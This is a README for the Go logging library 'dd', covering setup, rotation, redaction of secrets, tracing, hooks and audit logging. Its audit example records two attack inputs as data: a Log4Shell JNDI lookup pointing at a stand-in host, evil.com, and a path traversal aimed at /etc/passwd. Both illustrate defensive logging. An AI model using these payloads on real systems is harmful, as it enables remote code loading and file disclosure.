# DD - High-Performance Go Logging Library

[![Go Version](https://img.shields.io/badge/Go-1.25+-00ADD8?style=flat&logo=go)](https://go.dev/)
[![pkg.go.dev](https://pkg.go.dev/badge/github.com/cybergodev/dd.svg)](https://pkg.go.dev/github.com/cybergodev/dd)
[![License](https://img.shields.io/badge/license-MIT-brightgreen.svg)](LICENSE)
[![Security](https://img.shields.io/badge/security-policy-blue.svg)](SECURITY.md)
[![Thread Safe](https://img.shields.io/badge/thread%20safe-yes-brightgreen.svg)](https://github.com/cybergodev/dd)

A production-grade high-performance Go logging library with zero external dependencies, designed for modern cloud-native applications.

**[📖 中文文档](README_zh-CN.md)** | **[📦 pkg.go.dev](https://pkg.go.dev/github.com/cybergodev/dd)**

---

## ✨ Key Features

| Feature | Description |
|---------|-------------|
| 🚀 **High Performance** | 3M+ ops/sec simple logging, optimized for high-throughput |
| 🔒 **Thread-Safe** | Atomic operations + lock-free design, fully concurrent-safe |
| 🛡️ **Built-in Security** | Sensitive data filtering, injection attack prevention |
| 📊 **Structured Logging** | Type-safe fields, JSON/text formats, customizable field names |
| 📁 **Smart Rotation** | Auto-rotate by size, auto-compress, auto-cleanup |
| 📦 **Zero Dependencies** | Only Go standard library |
| 🎯 **Easy to Use** | Get started in 30 seconds with intuitive API |
| 🌐 **Cloud-Native** | JSON format compatible with ELK/Splunk/CloudWatch |

---

## 📦 Installation

```bash
go get github.com/cybergodev/dd
```

**Requirements:** Go 1.25+

---

## 🚀 Quick Start

### 30-Second Setup

```go
package main

import "github.com/cybergodev/dd"

func main() {
    // Zero setup - use package-level functions
    dd.Debug("Debug message")
    dd.Info("Application started")
    dd.Warn("Cache miss")
    dd.Error("Connection failed")
    // dd.Fatal("Critical error")  // Calls os.Exit(1)

    // Structured logging with fields
    dd.InfoWith("Request processed",
        dd.String("method", "GET"),
        dd.Int("status", 200),
        dd.Float64("duration_ms", 45.67),
    )
}
```

### File Logging

```go
package main

import (
    "log"

    "github.com/cybergodev/dd"
)

func main() {
    // One-line file logging with explicit error handling
    logger, err := dd.ToFile("logs/app.log")
    if err != nil {
        log.Fatalf("failed to create logger: %v", err)
    }
    defer logger.Close()

    logger.Info("Application started")
    logger.InfoWith("User login",
        dd.String("user_id", "12345"),
        dd.String("ip", "192.168.1.100"),
    )
}
```

### Convenience Constructors

```go
// Quick constructors with explicit error handling
logger, err := dd.ToFile("logs/app.log")    // → logs/app.log (text)
if err != nil { /* handle error */ }

logger, err = dd.ToJSONFile("logs/app.log") // → logs/app.log (JSON)
if err != nil { /* handle error */ }

logger, err = dd.ToConsole()                // → stdout only
if err != nil { /* handle error */ }

logger, err = dd.ToAll("logs/app.log")      // → console + file
if err != nil { /* handle error */ }

logger, err = dd.ToAllJSON("logs/app.log")  // → console + file (JSON)
if err != nil { /* handle error */ }

logger, err = dd.ToWriter(&buf)             // → bytes.Buffer
if err != nil { /* handle error */ }

logger, err = dd.ToWriters(os.Stdout, fileWriter) // → stdout + file
if err != nil { /* handle error */ }

defer logger.Close()
```

---

## 📖 Configuration

### Preset Configurations

```go
// Production (default) - Info level, text format
logger, err := dd.New(dd.DefaultConfig())

// Development - Debug level, caller info
logger, err := dd.New(dd.DevelopmentConfig())

// Cloud-native - JSON format, debug level
logger, err := dd.New(dd.JSONConfig())
```

### Custom Configuration

```go
cfg := dd.DefaultConfig()
cfg.Level = dd.LevelDebug
cfg.Format = dd.FormatJSON
cfg.DynamicCaller = true  // Show caller file:line

// File output with rotation
cfg.File = &dd.FileConfig{
    Path:       "logs/app.log",
    MaxSizeMB:  100,                 // Rotate at 100MB
    MaxBackups: 10,                  // Keep 10 backups
    MaxAge:     30 * 24 * time.Hour, // Delete after 30 days
    Compress:   true,                // Gzip old files
}

logger, err := dd.New(cfg)
if err != nil {
    log.Fatalf("failed to create logger: %v", err)
}
defer logger.Close()
```

### Configure Package-Level Functions

The package-level functions (`dd.Debug()`, `dd.Info()`, etc.) use a default logger. Use `InitDefault()` to customize its behavior:

```go
package main

import "github.com/cybergodev/dd"

func main() {
    // Configure the default logger for package-level functions
    cfg := dd.DefaultConfig()
    cfg.Level = dd.LevelDebug
    cfg.DynamicCaller = false  // Disable caller file:line output

    if err := dd.InitDefault(cfg); err != nil {
        panic(err)
    }

    // Now these use your configuration
    dd.Debug("Debug message")      // No caller info
    dd.Info("Application started") // No caller info

    // Re-enable caller info
    cfg.DynamicCaller = true
    dd.InitDefault(cfg)

    dd.Info("With caller info")    // Shows file:line
}
```

### JSON Customization

```go
cfg := dd.JSONConfig()
cfg.JSON.FieldNames = &dd.JSONFieldNames{
    Timestamp: "@timestamp",  // ELK standard
    Level:     "severity",
    Message:   "msg",
    Caller:    "source",
}
cfg.JSON.PrettyPrint = true  // For development

logger, err := dd.New(cfg)
if err != nil {
    log.Fatalf("failed to create logger: %v", err)
}
```

---

## 🛡️ Security Features

### Sensitive Data Filtering

```go
cfg := dd.DefaultConfig()
cfg.Security = dd.DefaultSecurityConfig()  // Enable basic filtering

logger, err := dd.New(cfg)
if err != nil {
    log.Fatalf("failed to create logger: %v", err)
}

// Automatic filtering
logger.Info("password=secret123")           // → password=[REDACTED]
logger.Info("api_key=sk-abc123")            // → api_key=[REDACTED]
logger.Info("credit_card=4532015112830366") // → credit_card=[REDACTED]
logger.Info("email=user@example.com")       // → email=[REDACTED]
```

| Security Level | Filter Type | Coverage |
|----------------|-------------|----------|
| `DefaultSecurityConfig()` | Basic | Passwords, API keys, credit cards, phone numbers, database URLs |
| `DefaultSecureConfig()` | Full | Basic + JWTs, AWS keys, IPs, SSNs |
| `HealthcareConfig()` | HIPAA | Full + PHI patterns |
| `FinancialConfig()` | PCI-DSS | Full + financial data |
| `GovernmentConfig()` | Government | Full + classified patterns |

### Custom Patterns

```go
filter := dd.NewEmptySensitiveDataFilter()
filter.AddPatterns(
    `(?i)internal_token[:\s=]+[^\s]+`,
    `(?i)session_id[:\s=]+[^\s]+`,
)

cfg := dd.DefaultConfig()
cfg.Security = &dd.SecurityConfig{
    SensitiveFilter: filter,
}
logger, err := dd.New(cfg)
if err != nil {
    log.Fatalf("failed to create logger: %v", err)
}
```

### Disable Security (Max Performance)

```go
cfg := dd.DefaultConfig()
cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelDevelopment)
```

---

## 📊 Structured Logging

### Field Types

```go
logger.InfoWith("All field types",
    dd.String("user", "alice"),
    dd.Int("count", 42),
    dd.Int64("id", 9876543210),
    dd.Float64("score", 98.5),
    dd.Bool("active", true),
    dd.Time("created_at", time.Now()),
    dd.Duration("elapsed", 150*time.Millisecond),
    dd.Err(errors.New("connection failed")),
    dd.ErrWithStack(errors.New("critical error")), // Include stack trace
    dd.Any("tags", []string{"vip", "premium"}),
)
```

### Field Chaining

```go
// Create logger with persistent fields
userLogger := logger.WithFields(
    dd.String("service", "user-api"),
    dd.String("version", "1.0.0"),
)

// All logs include service and version
userLogger.Info("User authenticated")
userLogger.InfoWith("Profile loaded", dd.String("user_id", "123"))

// Chain more fields
requestLogger := userLogger.WithFields(
    dd.String("request_id", "req-abc-123"),
)
requestLogger.Info("Processing request")
```

---

## 🔧 Output Management

### Multiple Outputs

```go
// Console + file with explicit error handling
logger, err := dd.ToAll("logs/app.log")
if err != nil { /* handle error */ }

// Or use MultiWriter
fileWriter, err := dd.NewFileWriter("logs/app.log")
if err != nil { /* handle error */ }

multiWriter := dd.NewMultiWriter(os.Stdout, fileWriter)

cfg := dd.DefaultConfig()
cfg.Output = multiWriter
logger, err := dd.New(cfg)
```

### Buffered Writes (High Throughput)

```go
fileWriter, err := dd.NewFileWriter("logs/app.log")
if err != nil { /* handle error */ }

bufferedWriter, err := dd.NewBufferedWriter(fileWriter)  // Default 4KB buffer
if err != nil { /* handle error */ }
defer bufferedWriter.Close()  // IMPORTANT: Flush on close

cfg := dd.DefaultConfig()
cfg.Output = bufferedWriter
logger, err := dd.New(cfg)
```

### Dynamic Writer Management

```go
logger, err := dd.New()
if err != nil { /* handle error */ }

fileWriter, err := dd.NewFileWriter("logs/dynamic.log")
if err != nil { /* handle error */ }

logger.AddWriter(fileWriter)        // Add at runtime
logger.RemoveWriter(fileWriter)     // Remove at runtime

fmt.Printf("Writers: %d\n", logger.WriterCount())
```

---

## 🌐 Context & Tracing

### Context Keys

```go
ctx := context.Background()
ctx = dd.WithTraceID(ctx, "trace-abc123")
ctx = dd.WithSpanID(ctx, "span-def456")
ctx = dd.WithRequestID(ctx, "req-789xyz")

// Pattern 1: Extract context values and pass to WithFields
entry := logger.WithFields(
    dd.String("trace_id", dd.GetTraceID(ctx)),
    dd.String("span_id", dd.GetSpanID(ctx)),
)
entry.InfoWith("Processing request", dd.String("user", "alice"))

// Pattern 2: Use helper function for extraction
func extractTraceFields(ctx context.Context) []dd.Field {
    var fields []dd.Field
    if traceID := dd.GetTraceID(ctx); traceID != "" {
        fields = append(fields, dd.String("trace_id", traceID))
    }
    if spanID := dd.GetSpanID(ctx); spanID != "" {
        fields = append(fields, dd.String("span_id", spanID))
    }
    return fields
}

traceFields := extractTraceFields(ctx)
logger.InfoWith("User action", append(traceFields,
    dd.String("action", "login"),
)...)
```

> **Note:** Always use a valid parent context (e.g., `context.Background()`), never `nil`.

### Custom Context Extractors

```go
tenantExtractor := func(ctx context.Context) []dd.Field {
    if tenantID := ctx.Value("tenant_id"); tenantID != nil {
        return []dd.Field{dd.String("tenant_id", tenantID.(string))}
    }
    return nil
}

cfg := dd.DefaultConfig()
cfg.ContextExtractors = []dd.ContextExtractor{tenantExtractor}
logger, err := dd.New(cfg)
```

---

## 🪝 Hooks

```go
hooks := dd.NewHooksFromConfig(dd.HooksConfig{
    BeforeLog: []dd.Hook{
        func(ctx context.Context, hctx *dd.HookContext) error {
            fmt.Printf("Before: %s\n", hctx.Message)
            return nil
        },
    },
    AfterLog: []dd.Hook{
        func(ctx context.Context, hctx *dd.HookContext) error {
            fmt.Printf("After: %s\n", hctx.Message)
            return nil
        },
    },
    OnError: []dd.Hook{
        func(ctx context.Context, hctx *dd.HookContext) error {
            fmt.Printf("Error: %v\n", hctx.Error)
            return nil
        },
    },
})

cfg := dd.DefaultConfig()
cfg.Hooks = hooks
logger, err := dd.New(cfg)
```

---

## 🔐 Audit Logging

### Audit Events

```go
// Create audit logger
auditCfg := dd.DefaultAuditConfig()
auditLogger := dd.NewAuditLogger(auditCfg)
defer auditLogger.Close()

// Log security events
auditLogger.LogSensitiveDataRedaction("password=*", "password", "Password redacted")
auditLogger.LogPathTraversalAttempt("../../../etc/passwd", "Path traversal blocked")
auditLogger.LogSecurityViolation("LOG4SHELL", "Pattern detected", map[string]any{
    "input": "${jndi:ldap://evil.com/a}",
})
```

### Log Integrity

```go
// Create signer with secret key
integrityCfg := dd.DefaultIntegrityConfig()
signer, err := dd.NewIntegritySigner(integrityCfg)
if err != nil { /* handle error */ }

// Sign log messages
message := "Critical audit event"
signature := signer.Sign(message)
fmt.Printf("Signed: %s %s\n", message, signature)

// Verify signature
result := dd.VerifyAuditEvent(message+" "+signature, signer)
if result.Valid {
    fmt.Println("Signature valid")
}
```

---

## 📈 Performance

| Operation | Throughput | Memory/Op | Allocs/Op |
|-----------|------------|-----------|-----------|
| Simple Logging | **3.1M ops/sec** | 200 B | 7 |
| Structured (3 fields) | **1.9M ops/sec** | 417 B | 12 |
| JSON Format | **600K ops/sec** | 800 B | 20 |
| Level Check | **2.5B ops/sec** | 0 B | 0 |
| Concurrent (22 goroutines) | **68M ops/sec** | 200 B | 7 |

**Optimization Tips:**
- Use `IsLevelEnabled()` before expensive operations: `if logger.IsDebugEnabled() { ... }`
- Enable buffered writes for high-throughput scenarios
- Disable security filtering in trusted environments

---

## 📚 API Reference

### Log Levels

| Constant | Value | Description |
|----------|-------|-------------|
| `dd.LevelDebug` | 1 | Detailed diagnostic info |
| `dd.LevelInfo` | 2 | General operational messages (default) |
| `dd.LevelWarn` | 3 | Warning conditions |
| `dd.LevelError` | 4 | Error conditions |
| `dd.LevelFatal` | 5 | Severe errors (calls os.Exit(1)) |

### Package-Level Functions

```go
// Simple logging
dd.Debug(args ...any)
dd.Info(args ...any)
dd.Warn(args ...any)
dd.Error(args ...any)
dd.Fatal(args ...any)  // Calls os.Exit(1)

// Formatted logging
dd.Debugf(format string, args ...any)
dd.Infof(format string, args ...any)
dd.Warnf(format string, args ...any)
dd.Errorf(format string, args ...any)
dd.Fatalf(format string, args ...any)

// Structured logging
dd.InfoWith(msg string, fields ...dd.Field)
dd.ErrorWith(msg string, fields ...dd.Field)
// ... DebugWith, WarnWith, FatalWith

// Global logger management
dd.InitDefault(cfg *Config) error    // Initialize default logger with config
dd.SetDefault(logger *Logger)
dd.SetLevel(level LogLevel)
dd.GetLevel() LogLevel
```

### Logger Methods

```go
logger, err := dd.New()

// Simple logging
logger.Info(args ...any)
logger.Infof(format string, args ...any)
logger.InfoWith(msg string, fields ...Field)

// Level management
logger.SetLevel(level LogLevel) error
logger.GetLevel() LogLevel
logger.IsLevelEnabled(level LogLevel) bool

// Writer management
logger.AddWriter(w io.Writer) error
logger.RemoveWriter(w io.Writer) error
logger.WriterCount() int

// Lifecycle
logger.Flush() error
logger.Close() error
logger.IsClosed() bool

// Field chaining
logger.WithFields(fields ...Field) *LoggerEntry
logger.WithField(key string, value any) *LoggerEntry
```

### Field Constructors

```go
dd.String(key, value string)
dd.Int(key string, value int)
dd.Int64(key string, value int64)
dd.Float64(key string, value float64)
dd.Bool(key string, value bool)
dd.Time(key string, value time.Time)
dd.Duration(key string, value time.Duration)
dd.Err(err error)                    // Error field
dd.ErrWithStack(err error)           // Error with stack trace
dd.Any(key string, value any)        // Any type
```

### Context Functions

```go
// Set context values
dd.WithTraceID(ctx context.Context, id string) context.Context
dd.WithSpanID(ctx context.Context, id string) context.Context
dd.WithRequestID(ctx context.Context, id string) context.Context

// Get context values
dd.GetTraceID(ctx context.Context) string
dd.GetSpanID(ctx context.Context) string
dd.GetRequestID(ctx context.Context) string
```

### Convenience Constructors

| Constructor | Description |
|------------|-------------|
| `ToFile(path)` | File output (text format) |
| `ToJSONFile(path)` | File output (JSON format) |
| `ToConsole()` | Stdout only |
| `ToAll(path)` | Console + file (text format) |
| `ToAllJSON(path)` | Console + file (JSON format) |
| `ToWriter(w)` | Single io.Writer |
| `ToWriters(...w)` | Multiple io.Writer |

---

## 📁 Examples

See the [examples](examples) directory for complete, runnable examples:

| File | Description |
|------|-------------|
| [01_quick_start.go](examples/01_quick_start.go) | Basic usage in 5 minutes |
| [02_structured_logging.go](examples/02_structured_logging.go) | Type-safe fields, WithFields |
| [03_configuration.go](examples/03_configuration.go) | Config API, presets, rotation |
| [04_security.go](examples/04_security.go) | Filtering, custom patterns |
| [05_writers.go](examples/05_writers.go) | File, buffered, multi-writer |
| [06_context_hooks.go](examples/06_context_hooks.go) | Tracing, hooks |
| [07_convenience.go](examples/07_convenience.go) | Quick constructors |
| [08_production.go](examples/08_production.go) | Production patterns |
| [09_advanced.go](examples/09_advanced.go) | Sampling, validation |
| [10_audit_integrity.go](examples/10_audit_integrity.go) | Audit, integrity |

---

## 📄 License

MIT License - see [LICENSE](LICENSE) file for details.

---

If this project helps you, please give it a Star! ⭐
